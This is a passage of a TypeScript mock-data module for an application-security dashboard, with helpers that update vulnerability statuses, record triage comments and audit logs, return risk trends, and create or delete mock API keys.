      action_type: req.status ? 'STATUS_CHANGE' : 'TRIAGE_NOTE',
      old_status: req.status ? oldStatus : null,
      new_status: req.status ?? null,
      comment: req.comment || null,
      created_at: new Date().toISOString(),
    });
  }

  return vuln;
}

export function bulkUpdateMockVulns(
  vulnIds: string[],
  status?: UpdateVulnerabilityRequest['status'],
  comment?: string
): number {
  let updated = 0;
  for (const id of vulnIds) {
    try {
      updateMockVuln(id, { status, comment });
      updated++;
    } catch {
      // ignore missing
    }
  }
  return updated;
}

export function getMockVulnHistory(id: string): RemediationAuditLogResponse[] {
  return mockAuditLogs[id] || [];
}

export function addMockVulnComment(id: string, comment: string): RemediationAuditLogResponse {
  if (!mockAuditLogs[id]) mockAuditLogs[id] = [];
  const log: RemediationAuditLogResponse = {
    id: `log-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    vulnerability_id: id,
    actor_id: MOCK_CURRENT_USER.id,
    scan_id: null,
    action_type: 'COMMENT',
    old_status: null,
    new_status: null,
    comment,
    created_at: new Date().toISOString(),
  };
  mockAuditLogs[id].unshift(log);
  return log;
}

export function getMockAppTrends(appId: string): AppTrendsResponse {
  return (
    MOCK_APP_TRENDS[appId] || {
      app_id: appId,
      data_points: [
        {
          timestamp: new Date().toISOString(),
          scan_id: null,
          risk_score: 25.0,
          severity_counts: { critical: 0, high: 1, medium: 2, low: 3, info: 0 },
        },
      ],
    }
  );
}

export function getMockApiKeys(): ApiKeyResponse[] {
  return [...mockApiKeys];
}

export function createMockApiKey(req: CreateApiKeyRequest): CreateApiKeyResponse {
  const secretKey = `appsec_live_${Math.random().toString(36).substring(2, 12)}_${Math.random().toString(36).substring(2, 12)}`;
  const keyPrefix = secretKey.substring(0, 15);
  const newKey: CreateApiKeyResponse = {
    id: `k-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    name: req.name,
    key_prefix: keyPrefix,
    secret_key: secretKey,
    expires_at: req.expires_at || null,
    created_at: new Date().toISOString(),
  };
  mockApiKeys.unshift({
    id: newKey.id,
    name: newKey.name,
    key_prefix: newKey.key_prefix,
    expires_at: newKey.expires_at,
    last_used_at: null,
    created_at: newKey.created_at,
  });
  return newKey;
}

export function deleteMockApiKey(id: string): boolean {
  const init = mockApiKeys.length;
  mockApiKeys = mockApiKeys.filter((k) => k.id !== id);
  return mockApiKeys.length < init;
}
